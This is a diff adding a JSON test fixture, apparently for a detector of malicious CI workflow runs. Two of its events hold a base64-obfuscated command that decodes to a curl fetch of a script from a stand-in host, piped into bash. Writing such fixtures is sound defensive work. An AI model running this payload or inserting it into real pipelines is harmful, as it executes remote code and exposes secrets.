@@ -1,0 +1,5 @@
+[
+  {"expect_match": true, "event": {"action": "workflow_run", "workflow_ref": "run: echo Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vc3RlYWwuc2ggfCBiYXNoCgpjdXJsQ0FMTA | base64 -d | bash"}},
+  {"expect_match": false, "event": {"action": "workflow_run", "workflow_ref": "run: npm install && npm test"}},
+  {"expect_match": false, "event": {"action": "push", "workflow_ref": "run: echo Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vc3RlYWwuc2ggfCBiYXNoCgpjdXJsQ0FMTA | base64 -d | bash"}}
+]
